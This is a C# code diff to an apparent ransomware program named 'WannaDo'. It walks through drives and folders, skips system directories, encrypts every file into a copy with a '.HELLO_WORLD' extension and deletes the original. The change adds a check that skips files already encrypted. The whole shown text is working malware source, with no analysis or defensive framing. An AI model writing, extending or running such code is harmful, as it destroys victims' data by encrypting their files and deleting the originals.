@@ -40,18 +40,19 @@ namespace WannaDo {
             //encrypt directory and subdirectory files
             string destPath = $"{sourcePath}{cryptoExtension}";
             crypto.EncryptFile (sourcePath, destPath);
-            File.Delete(sourcePath);
-            Console.WriteLine($"{sourcePath} done!");
+            File.Delete (sourcePath);
+            Console.WriteLine ($"{sourcePath} done!");
         }
 
         ///// MAIN FUNCTION /////
         static void Main (string[] args) {
+            string cryptoExt = ".HELLO_WORLD";
             CurrentDrives ();
             AddAvoid ();
             AddTarget ();
 
             foreach (string disk in DiskLetters) {
-                if (disk.StartsWith ('Z')/*Main Disk is C, otherwise change the Disk Letter*/) //avoid windows, intel, microsoft folder
+                if (disk.StartsWith ('Z') /*Main Disk is C, otherwise change the Disk Letter*/ ) //avoid windows, intel, microsoft folder
                 {
                     //get all directories
                     for (int i = 0; i < target.Count; i++) {
@@ -68,8 +69,10 @@ namespace WannaDo {
                                     var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                     foreach (string file in files) {
                                         Console.WriteLine (file);
-                                        //encrypt here
-                                        EncryptFile(file, ".HELLO_WORLD");
+
+                                        //check and encrypt here
+                                        if (!file.EndsWith (cryptoExt)) EncryptFile (file, cryptoExt);
+                                        else Console.WriteLine ("crypto exists, avoid it");
                                     }
                                 } catch (UnauthorizedAccessException ex) {
                                     Console.WriteLine (ex.Message);
@@ -78,7 +81,7 @@ namespace WannaDo {
                             }
                         }
                     }
-                } else if (disk.StartsWith ('F') /*Insert Disk Letter or change else if to else for all Disks*/) {
+                } else if (disk.StartsWith ('F') /*Insert Disk Letter or change else if to else for all Disks*/ ) {
                     //encrypt all 
                     var dirs = Directory.GetDirectories (disk);
                     foreach (string dir in dirs) {
@@ -88,8 +91,9 @@ namespace WannaDo {
                             try {
                                 var files = Directory.GetFiles (dir, "*", SearchOption.AllDirectories);
                                 foreach (string file in files) {
-                                    //encrypt here
-                                    EncryptFile (file, ".HELLO_WORLD");
+                                    //check and encrypt here
+                                    if (!file.EndsWith (cryptoExt)) EncryptFile (file, cryptoExt);
+                                    else Console.WriteLine ("crypto exists, avoid it");
                                 }
                             } catch (UnauthorizedAccessException ex) {
                                 Console.WriteLine (ex.Message);
